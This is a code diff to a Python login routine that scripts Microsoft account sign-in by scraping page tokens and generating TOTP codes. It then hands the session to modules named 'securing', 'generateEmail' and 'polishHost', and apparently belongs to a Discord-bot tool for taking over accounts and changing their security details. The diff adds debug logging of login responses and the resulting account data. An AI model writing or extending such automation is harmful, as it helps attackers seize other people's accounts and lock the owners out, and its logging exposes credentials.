@@ -1,7 +1,8 @@
-from views.utils.buildAccountData import buildAccountData
-from views.utils.handleRedirects import handleRedirects
 from views.utils.securing.generateEmail import generateEmail
+from views.utils.buildAccountData import buildAccountData
 from views.utils.securing.getLiveData import getLiveData
+from views.utils.handleRedirects import handleRedirects
+from views.utils.securing.polishHost import polishHost
 from views.utils.securing.loginPWD import loginPWD
 from views.utils.initialSession import getSession
 from views.utils.securing.secure import secure
@@ -9,6 +10,7 @@ from cogs.utils.genTOTP import totp
 
 from database.database import DBConnection
 from time import time
+import logging
 import httpx
 import uuid
 import re
@@ -28,11 +30,13 @@ async def loginAuth(session: httpx.AsyncClient, email: str, data: dict, account:
         live_data["ppft"]
     )
 
+    logging.debug(f"Password login response: {pwd_login}")
     sFT_match = re.search(r'"sFT":"([^"]+)"', pwd_login)
     post_url_match = re.search(r'"urlPost":"(https://[^"]+)"', pwd_login)
     proof_match = re.search(r'"arrUserProofs":\[.*?"data":"(\d+)".*?"type":(?:10|14)', pwd_login, re.DOTALL)
 
     if not sFT_match or not post_url_match or not proof_match:
+        print("[X] - Invalid Password / Secret")
         return "invalid"
 
     sFT = sFT_match.group(1)
@@ -59,15 +63,25 @@ async def loginAuth(session: httpx.AsyncClient, email: str, data: dict, account:
             "type": "19",
             "login": email,
             "infoPageShown": "0"
-        }
+        },
+        follow_redirects = True
     )
+    logging.debug(f"Auth login response: {auth_post.text}")
 
-    msaauth = await handleRedirects(session, auth_post.text)
-    if not msaauth:
-        return None
+    urlPost = re.search(r'"urlPost":"([^"]+)"', auth_post.text)
+    logging.debug(f"Extracted urlPost: {urlPost.group(1) if urlPost else 'None'}")
+    if not urlPost:
+        msaauth = await handleRedirects(session, auth_post.text)
+        if not msaauth:
+            return None
+    ppft = re.search(r'"sFT":"([^"]+)"', auth_post.text).group(1)
+
+    await polishHost(session, {"urlPost": urlPost.group(1), "ppft": ppft})
 
     dsecured = await secure(session, True, account)
+    logging.info(f"Account: {dsecured}")
     final_time = (time() - initialTime)
+
     build_account = await buildAccountData(dsecured, final_time)
     return build_account
             
